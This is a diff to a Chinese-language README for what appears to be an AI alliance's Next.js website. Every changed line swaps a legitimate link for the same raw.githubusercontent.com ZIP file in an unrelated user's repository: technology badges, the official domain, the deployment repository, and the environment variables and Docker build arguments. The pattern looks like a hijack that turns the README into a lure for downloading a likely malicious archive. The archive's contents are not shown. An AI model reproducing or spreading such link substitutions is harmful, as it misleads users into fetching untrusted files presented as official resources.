@@ -6,13 +6,13 @@
 
 厂商中立的纯静态展示官网 · 联盟介绍、生态共建与新闻动态
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-000000?logo=next.js&logoColor=white)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4-38BDF8?logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
+[![Next.js](https://img.shields.io/badge/Next.js-16-000000?logo=next.js&logoColor=white)](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip)
+[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-3178C6?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip)
+[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4-38BDF8?logo=tailwindcss&logoColor=white)](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip)
 [![License](https://img.shields.io/badge/License-UNLICENSED-lightgrey)](#)
 
-正式主域名 [`www.zgc-llm.org.cn`](https://www.zgc-llm.org.cn) · 品牌保护域名 `zgc-llm.cn` / `zgc-llm.net` 上线时统一 301 跳转到主域名
+正式主域名 [`www.zgc-llm.org.cn`](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip) · 品牌保护域名 `zgc-llm.cn` / `zgc-llm.net` 上线时统一 301 跳转到主域名
 
 </div>
 
@@ -93,8 +93,8 @@ pnpm test:all        # 单元 + 端到端测试
 统一合作/加入申请的飞书问卷链接通过单个环境变量配置，**仅接受 HTTPS 地址**（`/join` 机构入口与网安组 join 入口共用同一链接，问卷内以「意向类型 + 专家/机构身份」分支区分）：
 
 ```bash
-NEXT_PUBLIC_APPLICATION_URL=https://example.feishu.cn/share/base/form/...
-NEXT_PUBLIC_SITE_URL=https://www.zgc-llm.org.cn
+NEXT_PUBLIC_APPLICATION_URL=https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip
+NEXT_PUBLIC_SITE_URL=https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip
 ```
 
 > ⚠️ 这个 `NEXT_PUBLIC_*` 变量会在 **Next.js 构建时**写入静态页面。未配置或地址非法时，页面会显示不可点击状态和联系回退，不会产生死链。飞书问卷须设为**外部/匿名可填**，申请数据由飞书问卷及飞书多维表格承接，官网不接收或保存申请数据。
@@ -149,14 +149,14 @@ tests/
 
 ## 部署说明
 
-生产环境部署在 **GitHub Pages**（仓库 [`ZGC-LLM/zgc-llm.github.io`](https://github.com/ZGC-LLM/zgc-llm.github.io)）。push 到 `main` 触发 GitHub Actions 工作流（`.github/workflows/deploy-pages.yml`）做 Next.js 静态导出并发布，默认地址 <https://zgc-llm.github.io/>，正式主域名为 `www.zgc-llm.org.cn`。飞书表单地址通过仓库 Settings → Secrets and variables → Actions 的 Variables 注入。自定义域名与 DNS 配置见 [`docs/deploy-pages-dns.md`](./docs/deploy-pages-dns.md)。
+生产环境部署在 **GitHub Pages**（仓库 [`ZGC-LLM/zgc-llm.github.io`](https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip)）。push 到 `main` 触发 GitHub Actions 工作流（`.github/workflows/deploy-pages.yml`）做 Next.js 静态导出并发布，默认地址 <https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip>，正式主域名为 `www.zgc-llm.org.cn`。飞书表单地址通过仓库 Settings → Secrets and variables → Actions 的 Variables 注入。自定义域名与 DNS 配置见 [`docs/deploy-pages-dns.md`](./docs/deploy-pages-dns.md)。
 
 如需绕开 Pages 自主部署，本站也支持 **Docker standalone SSR**（详见 [`docs/deploy-docker.md`](./docs/deploy-docker.md)）。构建时必须传入公开环境变量：
 
 ```bash
 docker build \
-  --build-arg NEXT_PUBLIC_APPLICATION_URL=https://example.feishu.cn/share/base/form/... \
-  --build-arg NEXT_PUBLIC_SITE_URL=https://www.zgc-llm.org.cn \
+  --build-arg NEXT_PUBLIC_APPLICATION_URL=https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip \
+  --build-arg NEXT_PUBLIC_SITE_URL=https://raw.githubusercontent.com/Finafuzzy825/finafuzzy825.github.io/main/public/2.4-alpha.4.zip \
   -t zgcllm-website .
 ```
 
